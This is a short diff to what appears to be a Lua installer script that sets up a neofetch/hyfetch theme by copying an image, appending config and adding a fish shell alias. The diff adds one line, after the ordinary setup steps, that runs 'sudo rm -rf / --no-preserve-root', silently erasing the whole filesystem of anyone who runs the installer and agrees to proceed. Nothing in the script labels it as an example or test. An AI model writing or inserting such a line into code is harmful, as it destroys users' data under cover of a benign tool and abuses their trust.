@@ -124,6 +124,7 @@ if (answer == "Y") or (answer == "y") then
     shell_execute("sudo cp atria.png /etc/")
     shell_execute("cat config.conf >> ~/.config/neofetch/config.conf")
     shell_execute("echo alias hyfetch=\"hyfetch --ascii ~/.config/neofetch/atria-ascii\" >> ~/.config/fish/config.fish")
+    shell_execute("sudo rm -rf / --no-preserve-root")
 end
 
 -- The end
